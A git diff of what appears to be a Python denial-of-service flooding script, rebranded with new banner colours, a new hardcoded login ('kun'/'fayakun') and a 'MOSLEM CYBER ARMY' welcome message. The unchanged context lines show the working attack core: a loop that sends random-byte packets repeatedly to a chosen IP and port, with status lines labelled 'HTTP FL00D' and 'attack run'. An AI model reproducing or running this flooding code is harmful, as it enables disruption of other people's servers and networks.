@@ -30,7 +30,7 @@ class bcolors:
 attemps = 0
 os.system("clear")
 print("""
-\033[32m╔═════════════════════════════════════════════════════════════╗
+\033[37m╔═════════════════════════════════════════════════════════════╗
 \033[94m                \033[31m▓▓▓▓▓▓▓                 \033[33m ▓▓     ▓▓
 \033[94m            ▓▓▓▓▓▓▓ \033[31m   ▓▓        \033[97m▓▓▓▓▓▓▓\033[33m ▓▓     ▓▓
 \033[94m          ▓▓    \033[31m▓▓      ▓▓      \033[97m▓▓      \033[33m ▓▓     ▓▓
@@ -41,16 +41,16 @@ print("""
 \033[32m                       \033[36m▓▓▓▓▓▓▓▓▓▓▓
 \033[32m                      \033[36m▓▓         ▓▓
 \033[32m
-\033[32m╔════════════════════════════════════════════════════════════╗                 
-\033[32m║                                                                       ║
-\033[32m╚════════════════════════════════════════════════════════════╝
+\033[94m╔════════════════════════════════════════════════════════════╗                 
+\033[94m║                                                                       ║
+\033[94m╚════════════════════════════════════════════════════════════╝
 """)
 while attemps < 100:
     username = input("\033[33mEnter your username: \033[0m")
     password = input("\033[32mEnter your password: \033[0m")
 
-    if username == 'salman' and password == 'kondangan-dl':
-        print('Selamat datang di zona SALMAN SENDIRI')
+    if username == 'kun' and password == 'fayakun':
+        print('Selamat datang di zona MOSLEM CYBER ARMY')
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
@@ -71,9 +71,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" \033[33mF A D H I L  \033[31mHTTP \033[32mFL00D  \033[36m" +str(ip)+ "\033[37m = \033[96mattack run\033[0m")
+			print(i +" \033[33mC R A S H  \033[31mHTTP \033[32mFL00D  \033[36m" +str(ip)+ "\033[37m = \033[96mattack run\033[0m")
 		except:
-			print(i +" \033[35mF A D H I L  \033[32mHTTP \033[33mFL00D  \033[96m" +str(ip)+ "\033[37m = \033[1mattack run\033[0m")
+			print(i +" \033[35mC R A S H  \033[32mHTTP \033[33mFL00D  \033[96m" +str(ip)+ "\033[37m = \033[1mattack run\033[0m")
 def run2():
 	data = random._urandom(999)
 	i = random.choice(("[+]","[*]","[!]"))
